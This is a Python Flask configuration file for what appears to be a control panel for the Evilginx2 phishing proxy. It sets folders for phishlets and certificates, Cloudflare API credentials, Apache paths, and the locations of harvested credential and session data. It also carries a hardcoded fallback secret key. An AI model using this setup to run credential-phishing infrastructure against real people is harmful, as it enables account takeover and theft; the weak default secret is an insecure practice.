"""
Configuration settings for the application
"""

import os
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

class Config:
    """Base configuration"""
    DEBUG = False
    TESTING = False
    SECRET_KEY = os.environ.get('SECRET_KEY', 'my_secret_key')
    UPLOAD_FOLDER = os.path.abspath(os.path.join(os.path.dirname(__file__), "uploads"))
    ASSETS_FOLDER = os.path.abspath(os.path.join(os.path.dirname(__file__), "assets"))
    PHISHLETS_FOLDER = os.path.abspath(os.path.join(os.path.dirname(__file__), "phishlets"))
    
    # CORS settings
    CORS_HEADERS = 'Content-Type,Authorization,X-Requested-With,Accept'
    
    # Cloudflare API
    CLOUDFLARE_API_KEY = os.environ.get('CLOUDFLARE_API_KEY')
    CLOUDFLARE_EMAIL = os.environ.get('CLOUDFLARE_EMAIL')
    
    # Evilginx paths
    EVILGINX_PATH = os.environ.get('EVILGINX_PATH', os.path.expanduser('~/evilginx2'))
    EVILGINX_CERT_BASE = os.environ.get('EVILGINX_CERT_BASE', os.path.expanduser('~/.evilginx/crt'))
    
    # Apache paths
    APACHE_CONF_PATH = os.environ.get('APACHE_CONF_PATH', '/etc/apache2/sites-available/000-default.conf')
    WWW_ROOT = os.environ.get('WWW_ROOT', '/var/www/html')
    
    # Credentials paths
    EVILGINX_DB_PATH = os.environ.get('EVILGINX_DB_PATH', '/root/.evilginx/data.db')
    CREDS_OUTPUT_FILE = os.environ.get('CREDS_OUTPUT_FILE', 'sessions.json')

class DevelopmentConfig(Config):
    """Development configuration"""
    DEBUG = True

class TestingConfig(Config):
    """Testing configuration"""
    TESTING = True
    DEBUG = True

class ProductionConfig(Config):
    """Production configuration"""
    pass

# Dictionary of configurations
config_by_name = {
    'development': DevelopmentConfig,
    'testing': TestingConfig,
    'production': ProductionConfig
}

# Get current configuration
def get_config():
    """Get the current configuration based on environment"""
    # Flask 2.3+ uses FLASK_DEBUG instead of FLASK_ENV
    flask_debug = os.environ.get('FLASK_DEBUG', '').lower() in ('1', 'true')
    env = os.environ.get('FLASK_APP_ENV', 'development')
    
    # If FLASK_DEBUG is explicitly set to False, use production
    if os.environ.get('FLASK_DEBUG', '').lower() in ('0', 'false') and env == 'development':
        env = 'production'
    
    return config_by_name.get(env, DevelopmentConfig)